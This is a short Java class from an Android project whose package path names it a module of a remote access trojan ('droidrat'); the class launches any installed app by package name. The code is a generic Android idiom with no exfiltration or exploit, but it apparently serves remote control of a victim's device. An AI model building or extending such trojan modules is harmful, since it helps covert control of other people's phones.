package com.je_chen.droidrat_je.rat.modules.appintent.runapp;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

public class RunApp {

    private PackageManager packageManager;

    public RunApp(PackageManager packageManager){
        this.packageManager=packageManager;
    }

    public void launchApp(Context context,String packageName){
        Intent launchApp = packageManager.getLaunchIntentForPackage(packageName);
        context.startActivity(launchApp);
    }

}
